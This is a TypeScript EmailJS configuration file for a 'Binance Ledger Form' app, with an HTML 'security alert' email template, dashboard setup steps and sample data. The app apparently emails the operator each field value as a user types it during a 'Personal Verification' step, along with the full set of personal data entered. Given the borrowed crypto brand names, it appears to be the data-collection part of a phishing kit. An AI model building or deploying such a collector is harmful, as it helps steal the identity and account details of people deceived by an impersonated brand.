
/**
 * EmailJS Template Configuration Guide
 * 
 * Copy this template into your EmailJS dashboard to receive properly formatted emails
 */

export const EMAIL_TEMPLATE_CONFIG = {
  // Template variables that our application sends
  templateVariables: {
    to_email: "{{to_email}}", // Recipient email (your admin email)
    from_name: "{{from_name}}", // Sender name (Binance Ledger System)
    subject: "{{subject}}", // Email subject
    message: "{{message}}", // Formatted message with all form data
    step: "{{step}}", // Current form step
    field: "{{field}}", // Field name (optional)
    value: "{{value}}", // Field value (optional)
    username: "{{username}}", // User's username (optional)
    timestamp: "{{timestamp}}", // When the action occurred
    allFormData: "{{allFormData}}" // Complete form data as JSON (optional)
  },

  // HTML template to copy into EmailJS dashboard
  htmlTemplate: `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance Ledger Form Activity</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .email-container {
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #F0B90B, #FCD535);
            color: #000;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            font-weight: bold;
        }
        .content {
            padding: 30px;
        }
        .alert-box {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            border-left: 4px solid #F0B90B;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        .alert-box.critical {
            background-color: #f8d7da;
            border-color: #f1c2c8;
            border-left-color: #dc3545;
        }
        .data-section {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
        }
        .data-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #e9ecef;
        }
        .data-row:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #495057;
            flex: 1;
        }
        .value {
            flex: 2;
            color: #212529;
            word-break: break-word;
        }
        .timestamp {
            color: #6c757d;
            font-size: 14px;
            text-align: center;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #dee2e6;
        }
        .footer {
            background-color: #f8f9fa;
            padding: 15px;
            text-align: center;
            font-size: 12px;
            color: #6c757d;
        }
        .step-badge {
            display: inline-block;
            background-color: #F0B90B;
            color: #000;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        pre {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 15px;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header">
            <h1>🔒 Binance Ledger Activity Alert</h1>
        </div>
        
        <div class="content">
            <div class="step-badge">{{step}}</div>
            
            <div class="alert-box critical">
                <strong>⚠️ Security Alert:</strong> New activity detected on your Binance Ledger form. Review the details below immediately.
            </div>
            
            <div class="data-section">
                <h3 style="margin-top: 0; color: #495057;">📋 Activity Details</h3>
                
                <div class="data-row">
                    <div class="label">Step:</div>
                    <div class="value">{{step}}</div>
                </div>
                
                {{#field}}
                <div class="data-row">
                    <div class="label">Field:</div>
                    <div class="value">{{field}}</div>
                </div>
                {{/field}}
                
                {{#value}}
                <div class="data-row">
                    <div class="label">Value:</div>
                    <div class="value"><strong>{{value}}</strong></div>
                </div>
                {{/value}}
                
                {{#username}}
                <div class="data-row">
                    <div class="label">Username:</div>
                    <div class="value">{{username}}</div>
                </div>
                {{/username}}
                
                <div class="data-row">
                    <div class="label">Timestamp:</div>
                    <div class="value">{{timestamp}}</div>
                </div>
            </div>
            
            {{#allFormData}}
            <div class="data-section">
                <h3 style="margin-top: 0; color: #495057;">📊 Complete Form Data</h3>
                <pre>{{allFormData}}</pre>
            </div>
            {{/allFormData}}
            
            <div class="alert-box">
                <strong>📧 Full Message:</strong><br>
                {{message}}
            </div>
        </div>
        
        <div class="footer">
            <p>This is an automated security notification from your Binance Ledger Form application.</p>
            <p>Generated at: {{timestamp}} | System: Binance Ledger Security Monitor</p>
        </div>
    </div>
</body>
</html>
  `,

  // Setup instructions
  setupInstructions: [
    "1. Log into your EmailJS dashboard at https://www.emailjs.com/",
    "2. Go to Email Templates section",
    "3. Click 'Create New Template'",
    "4. Copy the HTML template above into the template editor",
    "5. Set the template name to 'Binance Ledger Activity Alert'",
    "6. Configure the following settings:",
    "   - To Email: Your admin email address",
    "   - From Name: {{from_name}}",
    "   - Subject: {{subject}}",
    "   - Reply To: noreply@yourcompany.com",
    "7. Save the template and copy the Template ID",
    "8. Update TEMPLATE_ID in src/config/emailjs.config.ts",
    "9. Test the integration by filling out a form field"
  ],

  // Test data example
  testData: {
    to_email: "admin@yourcompany.com",
    from_name: "Binance Ledger System",
    subject: "Form Activity - Personal Verification - Field Update",
    message: `
Step: Personal Verification - Field Update
Field: firstName
Value: John
Username: john.doe@example.com
Timestamp: 2025-06-04T13:06:36.235Z

All Form Data:
{
  "firstName": "John",
  "lastName": "Doe",
  "email": "john.doe@example.com",
  "phone": "+1234567890",
  "address": "123 Main St",
  "city": "New York",
  "postalCode": "10001",
  "country": "United States",
  "dateOfBirth": "January 1, 1990"
}
    `.trim(),
    step: "Personal Verification - Field Update",
    field: "firstName",
    value: "John",
    username: "john.doe@example.com",
    timestamp: "2025-06-04T13:06:36.235Z",
    allFormData: JSON.stringify({
      firstName: "John",
      lastName: "Doe",
      email: "john.doe@example.com",
      phone: "+1234567890",
      address: "123 Main St",
      city: "New York",
      postalCode: "10001",
      country: "United States",
      dateOfBirth: "January 1, 1990"
    }, null, 2)
  }
};

export default EMAIL_TEMPLATE_CONFIG;
